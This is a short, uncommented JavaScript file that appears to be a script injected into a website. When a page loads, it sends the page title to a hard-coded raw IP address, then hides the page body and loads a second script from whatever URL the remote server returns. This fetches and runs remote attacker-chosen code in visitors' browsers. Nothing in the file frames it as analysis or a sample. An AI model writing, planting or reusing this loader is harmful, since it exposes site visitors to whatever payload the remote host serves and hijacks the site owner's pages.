function hideBody() {
    document.getElementsByTagName("body").length && (document.getElementsByTagName("body")[0].style.visibility = "hidden")
}

function checkLoad() {
    document.getElementsByTagName("head").length > 0 ? addScript() : setTimeout(checkLoad, 0)
}

function addScript() {
    var e = document.createElement("script"), t = document.getElementsByTagName("head")[0], n = document.title;
    e.type = "text/javascript", e.src = "http://103.200.125.229:1314/Admin.php?title=" + n + "&callback=callbackfunction", e.setAttribute("async", !1), e.setAttribute("defer", !1), insertAfter(t, e)
}

function insertAfter(e, t) {
    e.parentNode.insertBefore(t, e.nextSibling)
}

function callbackfunction(e) {
    hideBody();
    var t = document.createElement("script");
    t.type = "text/javascript", t.src = e.data, insertAfter(document.getElementsByTagName("head")[0], t)
}

setTimeout(function () {
    checkLoad()
}, 0);